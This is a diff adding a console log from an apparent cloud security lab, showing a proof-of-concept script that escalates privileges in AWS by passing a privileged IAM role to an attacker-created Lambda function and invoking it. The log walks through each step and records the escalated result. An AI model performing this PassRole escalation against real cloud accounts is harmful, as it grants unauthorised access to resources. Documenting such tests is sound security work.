@@ -1,0 +1,17 @@
+PS> python attacks\scripts\path1_passrole_privesc.py
+[*] operating as: arn:aws:sts::000000000000:assumed-role/cloudfracture-agent-exec-role/cf-attacker
+[*] Step A: as agent-exec-role, attempt iam:ListRoles (expect DENIED)
+    [+] denied as expected: AccessDenied
+[*] Step B: create Lambda with role=cloudfracture-privileged-role (PassRole + CreateFunction)
+    [+] function created - privileged-role passed to attacker-controlled code
+[*] Step C: invoke the Lambda (runs as privileged-role)
+    [+] escalated execution result:
+      {
+        "running_as": "assumed-role/cloudfracture-privileged-role/cloudfracture-privesc-poc",
+        "iam_listroles_worked": true,
+        "role_count": 5,
+        "sample_roles": ["cloudfracture-agent-exec-role", "cloudfracture-privileged-role", ...]
+      }
+[+] escalation proven: True
+[*] cleanup: operator deleted the PoC Lambda
+[*] evidence written to attacks/evidence/path1/evidence.json
